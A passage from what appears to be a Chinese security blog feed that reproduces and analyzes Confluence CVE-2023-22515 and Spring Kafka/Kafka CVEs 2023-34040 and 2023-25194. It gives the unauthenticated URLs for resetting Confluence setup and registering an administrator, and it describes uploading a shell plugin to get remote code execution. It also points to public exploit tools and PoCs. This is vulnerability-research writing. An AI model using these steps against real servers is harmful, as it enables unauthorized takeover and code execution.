class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false</span><br></pre></td></tr></table></figure><p>在进行覆盖 <code>setupComplete=false</code> 之后重新注册管理员</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/setup/setupadministrator-start.action</span><br></pre></td></tr></table></figure><h2 id="0x05-未授权之后的-RCE"><a href="#0x05-未授权之后的-RCE" class="headerlink" title="0x05 未授权之后的 RCE"></a>0x05 未授权之后的 RCE</h2><p>X1r0z 师傅已经介绍了一种 RCE 的方法，但是利用条件有限，需要 web目录可写并且高权限用户</p><p>其实有一种更简单的方法，看到：<a class="link" href="https://packetstormsecurity.com/files/175225/Atlassian-Confluence-Unauthenticated-Remote-Code-Execution.html">https://packetstormsecurity.com/files/175225/Atlassian-Confluence-Unauthenticated-Remote-Code-Execution.html<i class="fas fa-external-link-alt"></i></a></p><p>可以通过上传插件实现 RCE，利用工具github上已经存在了：<a class="link" href="https://github.com/AIex-3/confluence-hack/">https://github.com/AIex-3/confluence-hack/<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/plugins/servlet/upm</span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/managePlugins.png" class><p>上传 plugin_shellplug.jar，访问 <code>/plugins/servlet/com.jsos.shell/ShellServlet</code></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/rce.png" class><h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a class="link" href="http://www.bmth666.cn/2023/11/05/CVE-2023-22515-Confluence-Broken-Authentication/">http://www.bmth666.cn/2023/11/05/CVE-2023-22515-Confluence-Broken-Authentication/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://exp10it.cn/2023/10/atlassian-confluence-cve-2023-22515-%E5%88%86%E6%9E%90/">https://exp10it.cn/2023/10/atlassian-confluence-cve-2023-22515-%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2023-22515 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-34040 Kafka 反序列化 RCE</title>
    <link href="https://drun1baby.github.io/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/"/>
    <id>https://drun1baby.github.io/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/</id>
    <published>2023-11-27T01:47:49.000Z</published>
    <updated>2023-11-27T01:52:03.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-34040-Kafka-反序列化-RCE"><a href="#CVE-2023-34040-Kafka-反序列化-RCE" class="headerlink" title="CVE-2023-34040 Kafka 反序列化 RCE"></a>CVE-2023-34040 Kafka 反序列化 RCE</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Kafka 是 Spring Framework 生态系统中的一个模块，用于简化在 Spring 应用程序中集成 Apache Kafka 的过程，记录 (record) 指 Kafka 消息中的一条记录。</p><p>受影响版本中默认未对记录配置 <code>ErrorHandlingDeserializer</code>，当用户将容器属性 <code>checkDeserExWhenKeyNull</code> 或 <code>checkDeserExWhenValueNull</code> 设置为 true(默认为 false)，并且允许不受信任的源发布到 Kafka 主题中时，攻击者可将恶意 payload 注入到 Kafka 主题中，当反序列化记录头时远程执行任意代码。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.8.1 &lt;&#x3D; Spring-Kafka &lt;&#x3D; 2.9.10<br>3.0.0 &lt;&#x3D; Spring-Kafka &lt;&#x3D; 3.0.9</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这一个漏洞所影响的组件其实是 Spring-Kafka，严格意义上来说并不算是 kafka 的漏洞，应该算是 Spring 的漏洞。</p><h3 id="漏洞前置知识"><a href="#漏洞前置知识" class="headerlink" title="漏洞前置知识"></a>漏洞前置知识</h3><p>先来看一看 SpringBoot 和 Kafka 是怎么完成通讯&#x2F;消费的</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/SpringBootToKafka.png" class><p><strong>工作流程如下</strong></p><p>1、生产者将消息发送到 Kafka 集群中的某个 Broker（也可以是多个）<br>2、Kafka 集群将消息存储在一个或多个分区中，并为每个分区维护一个偏移量<br>3、消费者订阅一个或多个主题，并从 Kafka 集群中读取消息。<br>4、消费者按顺序读取每个分区中的消息，并跟踪每个分区的偏移量。</p><ul><li>ErrorHandlingDeserializer：是 Kafka中的一种反序列化器（Deserializer），它可以在反序列化过程中处理异常和错误。</li><li>checkDeserExWhenKeyNull &amp;&amp; checkDeserExWhenValueNull：是 Kafka 中的一种序列化器（Serializer），它可以在序列化过程中检查键（key&#x2F;value）是否为 null，并在发现值为 null 时抛出异常。</li></ul><p>再简单整理一下漏洞条件</p><blockquote><p>在受到影响的版本中，默认未对记录配置 <code>ErrorHandlingDeserializer</code><br>容器属性 <code>checkDeserExWhenKeyNull</code> 或 <code>checkDeserExWhenValueNull</code> 设置为 true</p></blockquote><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>其中需要我们起一个 Kafka 的服务，用来接收消息，本机上起比较麻烦，可以在 vps 上用 docker 迅速搭建，且需注意，Kafka 要能够接受外连，<code>docker-compose.yml</code> 如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">zookeeper:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">zookeeper</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;2181:2181&quot;</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">zookeeper</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">kafka:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">wurstmeister/kafka</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9092:9092&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9094:9094&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">zookeeper</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">KAFKA_ADVERTISED_HOST_NAME:</span> <span class="number">124.222</span><span class="number">.21</span><span class="number">.138</span></span><br><span class="line">      <span class="attr">KAFKA_ZOOKEEPER_CONNECT:</span> <span class="string">zookeeper:2181</span></span><br><span class="line">      <span class="attr">KAFKA_LISTENERS:</span> <span class="string">PLAINTEXT://0.0.0.0:9092,SSL://0.0.0.0:9094</span></span><br><span class="line">      <span class="attr">KAFKA_ADVERTISED_LISTENERS:</span> <span class="string">PLAINTEXT://124.222.21.138:9092,SSL://124.222.21.138:9094</span></span><br><span class="line">      <span class="attr">KAFKA_LISTENER_SECURITY_PROTOCOL_MAP:</span> <span class="string">PLAINTEXT:PLAINTEXT,SSL:SSL</span></span><br><span class="line">      <span class="attr">KAFKA_INTER_BROKER_LISTENER_NAME:</span> <span class="string">PLAINTEXT</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">kafka</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Spring Kafka 的生产者和消费者可以通过使用 Spring Kafka 提供的 <code>KafkaTemplate</code> 和 &#96;&#96;@KafkaListener&#96; 注解来编写。</p><p>生产者可以使用 <code>KafkaTemplate</code> 来发送消息到 Kafka 集群：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.springkafkatest.controller;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.springkafkatest.common.KafkaInfo;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.core.KafkaTemplate;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.support.SendResult;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.util.concurrent.ListenableFuture;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;  </span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutionException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@RestController</span>  </span><br><span class="line"><span class="meta">@RequestMapping(&quot;/producer&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProducerController</span> &#123;  </span><br><span class="line">    <span class="meta">@Autowired</span>  </span><br><span class="line">    <span class="keyword">private</span> KafkaTemplate&lt;String,String&gt; kafkaTemplate;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@PostMapping(&quot;/fireAndForget&quot;)</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fireAndForget</span><span class="params">()</span> &#123;  </span><br><span class="line">        kafkaTemplate.send(KafkaInfo.TOPIC_WELCOME, <span class="string">&quot;fireAndForget:&quot;</span> + LocalDateTime.now());  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>消费者可以使用 <code>@KafkaListener</code> 注解来监听 Kafka 集群中的消息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.springkafkatest.consumer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.springkafkatest.common.KafkaInfo;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.annotation.KafkaListener;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.MessageHeaders;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.handler.annotation.Headers;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.handler.annotation.Payload;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Component</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Consumer</span> &#123;  </span><br><span class="line">    <span class="meta">@KafkaListener(topics = KafkaInfo.TOPIC_WELCOME)</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">consumer2</span><span class="params">(<span class="meta">@Payload</span> String message, <span class="meta">@Headers</span> MessageHeaders headers)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;消费者(注解方式)：收到消息==&gt; &quot;</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;  message：&quot;</span> + message);  </span><br><span class="line">        System.out.println(<span class="string">&quot;  headers:&quot;</span>);  </span><br><span class="line">        headers.keySet().forEach(key -&gt; System.out.println(<span class="string">&quot;    &quot;</span> + key + <span class="string">&quot;:&quot;</span> + headers.get(key)));  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>连接成功</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/SuccessConnectKafka.png" class><p>访问 <code>http://localhost:8083/producer/sync</code> 发送一条记录</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/SuccessConnectKafka.png" class><h3 id="构造-payload"><a href="#构造-payload" class="headerlink" title="构造 payload"></a>构造 payload</h3><p>实际影响到的是 Consumer，且 Consumer 要设置 <code>checkDeserExWhenKeyNull</code> 或 <code>checkDeserExWhenValueNull</code> 为 true </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ConcurrentKafkaListenerContainerFactory&lt;String, Greeting&gt; factory = <span class="keyword">new</span> <span class="title class_">ConcurrentKafkaListenerContainerFactory</span>&lt;&gt;();  </span><br><span class="line">factory.getContainerProperties().setCheckDeserExWhenValueNull(<span class="literal">true</span>);  </span><br><span class="line">factory.getContainerProperties().setCheckDeserExWhenKeyNull(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>payload 参考 <a class="link" href="https://github.com/Contrast-Security-OSS/Spring-Kafka-POC-CVE-2023-34040">https://github.com/Contrast-Security-OSS/Spring-Kafka-POC-CVE-2023-34040<i class="fas fa-external-link-alt"></i></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>主要是来看反序列化的部分</p><p>断点会先走到 <code>org.springframework.kafka.listener.ListenerUtils#getExceptionFromHeader</code> 方法，它这里面会获取到 PoC 中的 <code>KEY_DESERIALIZER_EXCEPTION_HEADER</code>，并将其作为 headers</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/key.png" class><p>往下跟进 <code>byteArrayToDeserializationException()</code> 方法，这里就直接到反序列化的部分了，而在反序列化之前做了一次 <code>resolveClass()</code> 的校验。</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/resolveClass.png" class><p>而这里的 <code>resolveClass()</code> 校验是一次性的，这就代表我们可以构造其他的 Payload，如 CC 链等，证实是可以打通的</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/readObject.png" class><p>之后便会进入到对应类的 <code>readObject()</code> 方法</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a class="link" href="https://github.com/spring-projects/spring-kafka/commit/25ac793a78725e2ca4a3a2888a1506a4bfcf0c9d">https://github.com/spring-projects/spring-kafka/commit/25ac793a78725e2ca4a3a2888a1506a4bfcf0c9d<i class="fas fa-external-link-alt"></i></a></p><p>相当于把这里的 header 头加黑了</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/blackHeader.png" class>]]></content>
    
    
    <summary type="html">CVE-2023-34040 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-25194 Kafka Jndi 注入</title>
    <link href="https://drun1baby.github.io/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/"/>
    <id>https://drun1baby.github.io/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/</id>
    <published>2023-11-27T01:47:37.000Z</published>
    <updated>2023-11-27T01:53:33.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-25194-Kafka-Jndi-注入"><a href="#CVE-2023-25194-Kafka-Jndi-注入" class="headerlink" title="CVE-2023-25194 Kafka Jndi 注入"></a>CVE-2023-25194 Kafka Jndi 注入</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>漏洞通告地址：<a class="link" href="https://kafka.apache.org/cve-list.html">https://kafka.apache.org/cve-list.html<i class="fas fa-external-link-alt"></i></a></p><p>需要看的漏洞列表：</p><ul><li>CVE-2022-23305（SQL 注入，后面发现还是 log4j 的问题）</li><li>CVE-2023-25194（JNDI 注入 <a class="link" href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20Kafka%20Clients%20LDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2023-25194.md%EF%BC%89">https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20Kafka%20Clients%20LDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2023-25194.md）<i class="fas fa-external-link-alt"></i></a></li><li>CVE-2023-34040（反序列化攻击）</li></ul><p>主要是这三个漏洞，其余的一些 CVE-2021 或是 CVE-2022 很多都是受到 log4j 组件的影响</p><h1 id="CVE-2023-25194-JNDI-注入分析"><a href="#CVE-2023-25194-JNDI-注入分析" class="headerlink" title="CVE-2023-25194 JNDI 注入分析"></a>CVE-2023-25194 JNDI 注入分析</h1><h2 id="Apache-Kafka-Clients-Jndi-Injection"><a href="#Apache-Kafka-Clients-Jndi-Injection" class="headerlink" title="Apache Kafka Clients Jndi Injection"></a>Apache Kafka Clients Jndi Injection</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Kafka 是一个分布式数据流处理平台，可以实时发布、订阅、存储和处理数据流。Kafka Connect 是一种用于在 kafka 和其他系统之间可扩展、可靠的流式传输数据的工具。攻击者可以利用基于 SASL JAAS 配置和 SASL 协议的任意 Kafka 客户端，对 Kafka Connect worker 创建或修改连接器时，通过构造特殊的配置，进行 JNDI 注入来实现远程代码执行。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>2.4.0 &lt;&#x3D; Apache Kafka &lt;&#x3D; 3.3.2</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="Kafka-是什么"><a href="#Kafka-是什么" class="headerlink" title="Kafka 是什么"></a>Kafka 是什么</h4><p>Kafka 是一个开源的分布式消息系统，Kafka 可以处理大量的消息和数据流，具有高吞吐量、低延迟、可扩展性等特点。它被广泛应用于大数据领域，如日志收集、数据传输、流处理等场景。</p><p>感觉上和 RocketMQ 很类似，主要功能都是用来进行数据传输的。</p><h4 id="Kafka-客户端-SASL-JAAS-配置"><a href="#Kafka-客户端-SASL-JAAS-配置" class="headerlink" title="Kafka 客户端 SASL JAAS 配置"></a>Kafka 客户端 SASL JAAS 配置</h4><p>简单认证与安全层 (SASL, Simple Authentication and Security Layer ) 是一个在网络协议中用来认证和数据加密的构架，在 Kafka 的实际应用当中表现为 JAAS。</p><p>Java 认证和授权服务（Java Authentication and Authorization Service，简称 JAAS）是一个 Java 以用户为中心的安全框架，作为 Java 以代码为中心的安全的补充。总结一下就是用于认证。有趣的是 <strong>Shiro (JSecurity)</strong> 最初被开发出来的原因就是由于当时 JAAS 存在着许多缺点</p><p>参考自 <a class="link" href="https://blog.csdn.net/yinxuep/article/details/103242969">https://blog.csdn.net/yinxuep/article/details/103242969<i class="fas fa-external-link-alt"></i></a> 还有一些细微的配置这里不再展开。动态设置和静态修改 <code>.conf</code> 文件实际上效果是一致的。</p><h5 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h5><p>1、通常在服务器节点下配置服务器 JASS 文件，例如这里我们将其命名为 <code>kafka_server_jaas.conf</code>，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KafkaServer &#123;</span><br><span class="line">    org.apache.kafka.common.security.plain.PlainLoginModule required</span><br><span class="line">    username=&quot;eystar&quot;</span><br><span class="line">    password=&quot;eystar8888&quot;</span><br><span class="line">    user_eystar=&quot;eystar8888&quot;</span><br><span class="line">    user_yxp=&quot;yxp-secret&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><p>username +password 表示 kafka 集群环境各个代理之间进行通信时使用的身份验证信息。</p><p><code>user_eystar=&quot;eystar8888&quot;</code> 表示定义客户端连接到代理的用户信息，即创建一个用户名为 eystar，密码为 eystar8888 的用户身份信息，kafka 代理对其进行身份验证，可以创建多个用户，格式 <code>user_XXX=”XXX”</code></p><p>2、如果处于静态使用中，需要将其加入到 JVM 启动参数中，如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;x<span class="variable">$KAFKA_OPTS</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">export</span> KAFKA_OPTS=<span class="string">&quot;-Djava.security.auth.login.config=/opt/modules/kafka_2.11-2.0.0/config/kafka_server_jaas.conf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p><a class="link" href="https://kafka.apache.org/documentation/#brokerconfigs_sasl.jaas.config">https://kafka.apache.org/documentation/#brokerconfigs_sasl.jaas.config<i class="fas fa-external-link-alt"></i></a></p><h5 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h5><p>基本同服务端一致，如下步骤</p><p>1、配置客户端 JAAS 文件，命名为 <code>kafka_client_jaas.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">KafkaClient &#123;</span><br><span class="line">        org.apache.kafka.common.security.plain.PlainLoginModule required</span><br><span class="line">        username=&quot;eystar&quot;</span><br><span class="line">        password=&quot;eystar8888&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>2、JAVA 调用的 Kafka Client 客户端连接时指定配置属性 <code>sasl.jaas.config</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \</span><br><span class="line">    username=<span class="string">&quot;eystar&quot;</span> \</span><br><span class="line">password=<span class="string">&quot;eystar8888&quot;</span>;</span><br><span class="line"><span class="comment">// 即配置属性：（后续会讲到也能够动态配置，让我想起了 RocketMQ）</span></span><br><span class="line">Pro.set(“sasl.jaas.config”,”org.apache.kafka.common.security.plain.PlainLoginModule required username=\<span class="string">&quot;eystar\&quot; password=\&quot;eystar8888\&quot;;&quot;</span>;</span><br><span class="line">”);</span><br></pre></td></tr></table></figure><h4 id="Kafka-客户端动态修改-JAAS-配置"><a href="#Kafka-客户端动态修改-JAAS-配置" class="headerlink" title="Kafka 客户端动态修改 JAAS 配置"></a>Kafka 客户端动态修改 JAAS 配置</h4><p>方式一：配置 Properties 属性，可以注意到这一个字段的键名为 <code>sasl.jaas.config</code>，它的格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loginModuleClass controlFlag (optionName=optionValue)*;</span><br></pre></td></tr></table></figure><p>其中的 loginModuleClass 代表认证方式, 例如 LDAP, Kerberos, Unix 认证，可以参考官方文档 <a class="link" href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/jgss/tutorials/LoginConfigFile.html">https://docs.oracle.com/javase/8/docs/technotes/guides/security/jgss/tutorials/LoginConfigFile.html<i class="fas fa-external-link-alt"></i></a> 其中有一处为 <code>JndiLoginModule</code>，JDK 自带的 loginModule 位于 <code>com.sun.security.auth.module</code></p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/module.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//安全模式 用户名 密码</span></span><br><span class="line">props.setProperty(<span class="string">&quot;sasl.jaas.config&quot;</span>, <span class="string">&quot;org.apache.kafka.common.security.plain.PlainLoginModule required username=\&quot;usn\&quot; password=\&quot;pwd\&quot;;&quot;</span>);</span><br><span class="line">props.setProperty(<span class="string">&quot;security.protocol&quot;</span>, <span class="string">&quot;SASL_PLAINTEXT&quot;</span>);</span><br><span class="line">props.setProperty(<span class="string">&quot;sasl.mechanism&quot;</span>, <span class="string">&quot;PLAIN&quot;</span>);</span><br></pre></td></tr></table></figure><p>方式二：设置系统属性参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指定kafka_client_jaas.conf文件路径 </span></span><br><span class="line"><span class="type">String</span> <span class="variable">confPath</span> <span class="operator">=</span> TestKafkaComsumer.class.getResource(<span class="string">&quot;/&quot;</span>).getPath()+ <span class="string">&quot;/kafka_client_jaas.conf&quot;</span>; </span><br><span class="line">System.setProperty(<span class="string">&quot;java.security.auth.login.config&quot;</span>, confPath);</span><br></pre></td></tr></table></figure><h4 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h4><p><strong>消费者</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestComsumer</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span 